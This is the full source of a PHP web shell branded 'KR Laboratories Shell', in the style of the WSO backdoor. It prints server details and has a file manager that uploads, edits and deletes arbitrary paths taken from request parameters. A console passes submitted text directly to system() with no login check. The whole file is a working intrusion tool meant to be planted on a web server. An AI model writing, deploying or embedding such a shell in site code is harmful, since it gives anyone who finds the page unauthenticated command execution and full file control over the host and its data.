<?php
/*
	Author: 	KRLaboratories
	LinkedIn:  https://www.linkedin.com/company/kr-laboratories
	Gmail:		security@kr-labs.com.ua
	Date:		Monday, August 26, 2024
*/
$default_action = 'FilesMan';
$default_charset = 'UTF-8';

function wsoHeader() {
    global $default_charset;
    echo "<html><head>
    <meta charset='$default_charset'>
    <title>KR Laboratories Shell</title>
    <link rel='icon' href='https://kr-labs.com.ua/wp-content/uploads/2024/08/favicontryzub.gif'>
    <style>
        body { background-color: #1c1c1c; color: #d4d4d4; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 0; }
        h1 { color: #00ff00; }
        h2 { color: #00e0e0; }
        a { color: #00ff00; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .header { background-color: #282828; padding: 20px; text-align: center; }
        .header img { vertical-align: middle; }
        .header div { display: inline-block; vertical-align: middle; margin-left: 20px; text-align: left; }
        .header div.info { margin-left: 40px; color: #fff; }
        .main { padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { padding: 10px; border: 1px solid #333; }
        th { background-color: #3c3c3c; color: #fff; }
        tr:nth-child(even) { background-color: #2b2b2b; }
        tr:hover { background-color: #444444; }
        tr.directory { font-weight: bold; }
        .footer { background-color: #282828; padding: 10px; text-align: center; color: #fff; }
        .input-group { margin-bottom: 15px; }
        .input-group label { margin-right: 10px; }
        textarea { width: 100%; height: 400px; background-color: #2b2b2b; color: #00ff00; border: 1px solid #333; }
        .breadcrumb { margin-bottom: 20px; color: #00ff00; }
        .breadcrumb a { color: #00ff00; }
    </style>
    </head>
    <body>
    <div class='header'>
        <img src='https://kr-labs.com.ua/wp-content/uploads/2021/03/krlaboratories-it-ua.png' alt='KR Laboratories' width='150'>
        <div>
            <h2>KR Laboratories</h2>
            <p>Innovative IT Solutions</p>
            <p><a href='https://kr-labs.com.ua'>Website</a> | <a href='https://infosec.exchange/@krlaboratories'>Mastodon</a> | <a href='https://www.linkedin.com/company/krlaboratories'>LinkedIn</a></p>
        </div>
        <div class='info'>";
        
        // Technical info block
        echo "<h2>System Information</h2>";
        echo "<p>Uname: " . php_uname() . "</p>";
        echo "<p>User: " . get_current_user() . " | Group: " . posix_getgrgid(posix_getegid())['name'] . "</p>";
        echo "<p>PHP: " . phpversion() . " | Safe Mode: " . (ini_get('safe_mode') ? 'ON' : 'OFF') . "</p>";
        echo "<p>Server IP: " . $_SERVER['SERVER_ADDR'] . " | Your IP: " . $_SERVER['REMOTE_ADDR'] . "</p>";
        echo "<p>DateTime: " . date('Y-m-d H:i:s') . "</p>";
        $totalSpace = @disk_total_space("/");
        $freeSpace = @disk_free_space("/");
        echo "<p>HDD: Total: " . wsoViewSize($totalSpace) . " Free: " . wsoViewSize($freeSpace) . " (" . round(($freeSpace / $totalSpace) * 100) . "%)</p>";
        
    echo "</div>
    </div>
    <div class='main'>";
}

function wsoFooter() {
    echo "</div>
    <div class='footer'>
        &copy; 2024 KR Laboratories. All Rights Reserved.
    </div>
    </body></html>";
}

function wsoViewSize($size) {
    if ($size >= 1073741824) {
        return sprintf('%1.2f', $size / 1073741824) . ' GB';
    } elseif ($size >= 1048576) {
        return sprintf('%1.2f', $size / 1048576 ) . ' MB';
    } elseif ($size >= 1024) {
        return sprintf('%1.2f', $size / 1024 ) . ' KB';
    } else {
        return $size . ' B';
    }
}

function wsoBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumb = [];
    $link = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $link .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = "<a href='?c=" . urlencode($link) . "'>" . htmlspecialchars($part) . "</a>";
    }
    return implode(" / ", $breadcrumb);
}

function wsoFilesMan() {
    $cwd = getcwd();
    echo "<h2>File Manager</h2>";
    echo "<p class='breadcrumb'>Current Directory: " . wsoBreadcrumb($cwd) . "</p>";

    // Handle file upload
    if (isset($_FILES['file'])) {
        $uploadfile = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
            echo "<p>File successfully uploaded.</p>";
        } else {
            echo "<p>File upload failed.</p>";
        }
    }

    // Handle file or directory deletion
    if (isset($_GET['delete'])) {
        $deletePath = $_GET['delete'];
        if (is_dir($deletePath)) {
            function deleteDir($dirPath) {
                if (!is_dir($dirPath)) {
                    throw new InvalidArgumentException("$dirPath must be a directory");
                }
                if (substr($dirPath, strlen($dirPath) - 1, 1) != DIRECTORY_SEPARATOR) {
                    $dirPath .= DIRECTORY_SEPARATOR;
                }
                $files = glob($dirPath . '*', GLOB_MARK);
                foreach ($files as $file) {
                    if (is_dir($file)) {
                        deleteDir($file);
                    } else {
                        unlink($file);
                    }
                }
                rmdir($dirPath);
            }
            deleteDir($deletePath);
            echo "<p>Directory successfully deleted.</p>";
        } else {
            if (unlink($deletePath)) {
                echo "<p>File successfully deleted.</p>";
            } else {
                echo "<p>File deletion failed.</p>";
            }
        }
    }

    $files = scandir($cwd);
    if ($files === false) {
        echo "<p>Unable to open directory.</p>";
    } else {
        echo "<table>";
        echo "<tr><th>Name</th><th>Size</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
        if ($cwd !== '/') {
            echo "<tr class='directory'>
                    <td><a href='?c=" . urlencode(dirname($cwd)) . "'>...</a></td>
                    <td>dir</td>
                    <td>-</td>
                    <td>-</td>
                    <td>-</td>
                  </tr>";
        }
        foreach ($files as $file) {
            if ($file == "." || $file == "..") continue;
            $path = $cwd . DIRECTORY_SEPARATOR . $file;
            $size = is_dir($path) ? 'dir' : wsoViewSize(filesize($path));
            $perms = substr(sprintf('%o', fileperms($path)), -4);
            $owner = posix_getpwuid(fileowner($path))['name'];
            $group = posix_getgrgid(filegroup($path))['name'];

            if (is_dir($path)) {
                echo "<tr class='directory'>
                        <td><a href='?c=" . urlencode($path) . "'>$file</a></td>
                        <td>$size</td>
                        <td>$owner/$group</td>
                        <td>$perms</td>
                        <td><a href='?delete=" . urlencode($path) . "'>Delete</a></td>
                      </tr>";
            } else {
                echo "<tr>
                        <td><a href='?edit=" . urlencode($path) . "'>$file</a></td>
                        <td>$size</td>
                        <td>$owner/$group</td>
                        <td>$perms</td>
                        <td><a href='?edit=" . urlencode($path) . "'>Edit</a> | <a href='?delete=" . urlencode($path) . "'>Delete</a></td>
                      </tr>";
            }
        }
        echo "</table>";
    }

    echo "<h2>Upload File</h2>
          <form enctype='multipart/form-data' method='post'>
              <div class='input-group'>
                  <input type='file' name='file'>
                  <input type='submit' value='Upload'>
              </div>
          </form>";
}

function wsoEditFile($file) {
    echo "<h2>Editing: " . htmlspecialchars(basename($file)) . "</h2>";

    if (isset($_POST['filedata'])) {
        file_put_contents($file, $_POST['filedata']);
        echo "<p>File successfully saved.</p>";
    }

    $data = htmlspecialchars(file_get_contents($file));
    echo "<form method='post'>
        <textarea name='filedata'>$data</textarea>
        <input type='submit' value='Save'>
    </form>";

    echo "<p><a href='?c=" . urlencode(dirname($file)) . "'>Back</a></p>";
}

function wsoConsole() {
    echo "<h2>Command Execution</h2>
    <form method='post'>
        <div class='input-group'>
            <label for='command'>Enter command:</label>
            <input type='text' id='command' name='command'>
        </div>
        <input type='submit' value='Execute'>
    </form>";

    if (isset($_POST['command'])) {
        echo "<h2>Command Output:</h2><pre>";
        system($_POST['command']);
        echo "</pre>";
    }
}

wsoHeader();

if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    wsoEditFile($_GET['edit']);
} elseif (isset($_GET['c']) && is_dir($_GET['c'])) {
    chdir($_GET['c']);
    wsoConsole();
    wsoFilesMan();
} else {
    wsoConsole();
    wsoFilesMan();
}

wsoFooter();
?>
